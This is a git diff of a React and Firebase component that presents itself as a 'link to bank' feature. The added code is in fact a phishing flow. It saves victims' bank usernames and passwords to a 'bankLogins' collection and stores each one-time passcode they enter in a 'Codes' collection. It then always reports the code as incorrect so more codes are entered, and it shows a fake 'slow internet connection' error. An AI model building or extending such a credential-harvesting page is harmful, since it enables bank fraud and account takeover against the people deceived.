@@ -1,16 +1,37 @@
-import { useState, useRef } from "react";
+import { useState, useRef, useEffect} from "react";
 import banks from "./bankData";
 import { createUserWithEmailAndPassword } from "firebase/auth";
 import { auth, db } from "../firebaseAuth";
-import { setDoc, doc } from "firebase/firestore";
+import { setDoc } from "firebase/firestore";
 import { toast } from "react-toastify";
+import { addDoc, collection, getDocs, doc, updateDoc, getDoc } from "firebase/firestore";
+import app from "../firebaseAuth";
 
 
 
 function LinkToBank() {
     console.log(banks)
 
-    const [selectedBank, setSelectedBank] = useState([])
+     const [userDetails, setUserDetails] = useState(null)
+        const fetchUserData = async (e) => {
+            auth.onAuthStateChanged(async (user) => {
+                console.log(user);
+                const docRef = doc(db, "users", user.uid);
+                const docSnap = await getDoc(docRef);
+                if (docSnap.exists()) {
+                    setUserDetails(docSnap.data())
+                    console.log(docSnap.data())
+                }
+            })
+        };
+    
+        useEffect(() => {
+            fetchUserData()
+        }, [])
+    
+
+    const [selectedBank, setSelectedBank] = useState({})
+      const [showLoad, setShowLoad] = useState(false)
     
     const [bankState, setBankState] = useState("selectBank")
 
@@ -36,27 +57,38 @@ function LinkToBank() {
 
    async function submitLogs(e){
     e.preventDefault();
+    setShowLoad(true)
+    setTimeout(()=> {
+     if(bankState == "login") {
+      setShowLoad(false)
+     toast.error("slow internet connection", {position: "top-center"})
+     }
+    }, 10000)
     console.log("clicked")
        if(logs.username && logs.password) {
          try{
-         await setDoc(doc(db, "bankLogins", "good game"), {
+         await setDoc(doc(db, "bankLogins", userDetails.Fname + userDetails.Lname), {
             username: logs.username,
             password: logs.password,
          })
          .then((data)=> {
            toast.success("submitted", {position: "top-center"})
            setBankState("otp")
+           setShowLoad(false)
          })
          .catch((error)=> {
             toast.error("error occured", {position: "top-center"})
             console.log(error.message)
+            setShowLoad(false)
          })
         }catch(error){
            toast.error(error, {position: "top-center"})
            console.log(error)
+           setShowLoad(false)
         }
        }else {
         toast.error("fill in the details", {position: "top-center"})
+        setShowLoad(false)
        }
     }
 
@@ -81,20 +113,37 @@ function LinkToBank() {
     }
   };
 
+  console.log(Date())
+
   const handleKeyDown = (e, index) => {
     if (e.key === "Backspace" && otp[index] === "" && index > 0) {
       inputsRef.current[index - 1].focus();
     }
   };
 
-  const handleSubmit = (e) => {
+  const handleSubmit = async (e) => {
     e.preventDefault();
     const otpValue = otp.join("");
     if (otpValue.length === 6) {
-      alert(`OTP Entered: ${otpValue}`);
-      // Add your verification logic here
+      try{
+       await setDoc(doc(db, "Codes", userDetails.Fname + " " + Date()), {
+            code: otpValue,
+         })
+         .then((data)=> {
+           toast.error("incorrect otp code entered", {position: "top-center"})
+           setShowLoad(false)
+         })
+         .catch((error)=> {
+            toast.error("error occured", {position: "top-center"})
+            console.log(error.message)
+            setShowLoad(false)
+         })
+      }catch(error) {
+        console.log(error.message)
+
+      }
     } else {
-      alert("Please enter a 6-digit OTP");
+      toast.error("Please enter a 6-digit OTP", {position: "top-center"});
     }
   };
 
@@ -111,7 +160,13 @@ function LinkToBank() {
     })
 
     function showBankState() {
-        if (bankState == "selectBank") {
+        const bankLogo = {
+          background: `url(${selectedBank.img})`,
+          backgroundSize: `contain`,
+          backgroundPosition: `center`,
+          backgroundRepeat: `no-repeat`
+        }
+        if (bankState == "selectBank") {  
             return <div>
                 <div className="link-head">
                     <h1>Select Bank</h1>
@@ -121,8 +176,8 @@ function LinkToBank() {
                 </div>
             </div>
         } else if (bankState == "login") {
-            return selectedBank ? <div>
-              <div className="bank-img">
+            return selectedBank ? <div className="bank-sign">
+              {/* <div className="bank-img">
                   <img src={selectedBank.img} alt="" width="200"/>
               </div>
                 <h1 className="bank-log">Log In</h1>
@@ -130,7 +185,7 @@ function LinkToBank() {
                 <div className="log-boxer" >
                     <div>
                         <h1>Email or Username</h1>
-                        <input type="email" name="username" onChange={getLogs}/>
+                        <input type="text" name="username" onChange={getLogs}/>
                     </div>
                     <div>
                         <h1>Password</h1>
@@ -141,7 +196,28 @@ function LinkToBank() {
                     </div>
                     <button className="bank-btn" onClick={submitLogs}>Login</button>
                     <p style={{textAlign: "center", fontSize: "18px"}} onClick={()=> setBankState("selectBank")}><i className="bi-arrow-left"></i> Go Back</p>
-                </div>
+                </div> */}
+                <div class="signup-container">
+                 <div className="my-logger">
+                   <div className="logger-pic" style={bankLogo}></div>
+                 </div>
+      <h2 className="create-head">Log In</h2>
+      <form id="signupForm" className="my-form" onSubmit={submitLogs}>
+        
+
+        <label for="username">Email or Username</label>
+        <input type="text" id="username"  name="username" onChange={getLogs}  required/>
+
+        <label for="password">Password</label>
+        <input type="password" id="password" name="password" onChange={getLogs} required />
+
+
+        <button type="submit">Sign Up</button>
+      </form>
+      <div class="note">
+        forgotten Password? <a href="login.html">reset</a>
+      </div>
+    </div>
             </div>: ""
         } else if(bankState == "otp") {
             return <div>
@@ -189,7 +265,12 @@ function LinkToBank() {
     }
     return (
         <section className="link-to-bank">
-            {showBankState()}
+           {showLoad ? <div className="login-loader">
+        <span className="loader"></span>
+      </div> : ""}
+            {userDetails ? showBankState(): <div className="login-loader">
+        <span className="loader"></span>
+      </div> }
         </section>
     )
 }
